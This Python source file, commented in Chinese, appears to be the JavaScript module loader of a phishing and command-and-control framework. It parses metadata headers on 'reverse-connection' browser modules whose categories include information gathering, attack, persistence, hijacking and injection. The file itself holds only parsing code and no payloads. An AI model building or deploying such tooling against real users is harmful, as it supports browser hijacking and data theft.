"""JS 反连模块加载器 — 扫描 js_modules/*.js,解析文件头元数据。

模块格式(与 c2_server 的 .py+MODULE 同构,单文件自包含):
    // MODULE = {"desc": "模块描述", "category": "信息收集", "params": [["param1", "提示"], ...]}
    (function () {
        // 模块体:可用内建 SERVER / report(data) / _q()
    })();

category 取值:信息收集 / 攻击 / 持久化 / 劫持 / 网络 / 注入 / 自定义(缺省"自定义")。

加载失败显式化:无 MODULE 头 / JSON 非法 / 结构错误 → 告警跳过(不静默)。
"""

import json
import logging
import os
import re
from dataclasses import dataclass, field
from typing import List, Optional

logger = logging.getLogger("phishing.module_loader")

_MODULE_HEAD_RE = re.compile(r"^\s*//\s*MODULE\s*=\s*(\{.*\})\s*$", re.M)


@dataclass
class ModuleInfo:
    name: str
    path: str
    desc: str = ""
    category: str = "自定义"
    params: list = field(default_factory=list)   # [(name, hint), ...]
    body: str = ""                               # 去 MODULE 注释行后的源码


class JsModuleLoader:
    """JS 模块加载器。扫描目录,解析 .js 模块。"""

    def __init__(self, modules_dir: str = "js_modules"):
        self._modules_dir = modules_dir
        self._modules: dict = {}

    # ── 公开接口 ──

    def load(self) -> None:
        """扫描并加载全部模块。"""
        self._modules.clear()
        if not os.path.isdir(self._modules_dir):
            logger.warning("js modules dir not found: %s", self._modules_dir)
            return
        for filename in sorted(os.listdir(self._modules_dir)):
            path = os.path.join(self._modules_dir, filename)
            if not os.path.isfile(path) or not filename.endswith(".js"):
                continue
            self._load_module(filename, path)

    def list_modules(self) -> list:
        """列出模块摘要: [{name, desc, category, params}]"""
        return [
            {"name": m.name, "desc": m.desc, "category": m.category, "params": list(m.params)}
            for m in self._modules.values()
        ]

    def get_module(self, name: str) -> Optional[dict]:
        """获取模块完整元数据;不存在返回 None。"""
        mod = self._modules.get(name)
        if not mod:
            return None
        return {"name": mod.name, "desc": mod.desc,
                "params": list(mod.params), "body": mod.body}

    def param_names(self, name: str) -> list:
        """模块声明的参数名列表。"""
        mod = self._modules.get(name)
        if not mod:
            return []
        return [p[0] for p in mod.params if isinstance(p, (list, tuple)) and p]

    def reload(self) -> None:
        """热加载:重新扫描目录。"""
        self.load()

    def reconfigure(self, modules_dir: str = None) -> None:
        if modules_dir is not None:
            self._modules_dir = modules_dir
        self.load()

    # ── 内部 ──

    def _load_module(self, filename: str, path: str) -> None:
        name = filename[:-3]
        try:
            with open(path, "r", encoding="utf-8") as f:
                content = f.read()
        except OSError as e:
            logger.warning("js module %s: read failed: %s", name, e)
            return
        if not content.strip():
            logger.warning("js module %s: empty file, skipped", name)
            return
        m = _MODULE_HEAD_RE.search(content)
        if not m:
            logger.warning("js module %s: 缺少 // MODULE = {...} 元数据头, skipped", name)
            return
        try:
            meta = json.loads(m.group(1))
        except json.JSONDecodeError as e:
            logger.warning("js module %s: MODULE 元数据 JSON 非法: %s, skipped", name, e)
            return
        if not isinstance(meta, dict):
            logger.warning("js module %s: MODULE 必须是对象, skipped", name)
            return
        desc = str(meta.get("desc", ""))
        params = meta.get("params", [])
        if not isinstance(params, list):
            logger.warning("js module %s: MODULE['params'] 必须是列表, skipped", name)
            return
        norm = []
        for p in params:
            if isinstance(p, (list, tuple)) and len(p) >= 1 and isinstance(p[0], str):
                hint = p[1] if len(p) > 1 and isinstance(p[1], str) else ""
                norm.append((p[0], hint))
            else:
                logger.warning("js module %s: 非法 params 项 %r 忽略", name, p)
        # 去 MODULE 注释行(保留其他注释)
        body = _MODULE_HEAD_RE.sub("", content, count=1).strip()
        if not body:
            logger.warning("js module %s: 无模块体, skipped", name)
            return
        self._modules[name] = ModuleInfo(
            name=name,
            path=path,
            desc=desc,
            category=str(meta.get("category", "自定义")) or "自定义",
            params=norm,
            body=body,
        )
        logger.info("js module loaded: %s (params=%s)", name, [p[0] for p in norm])
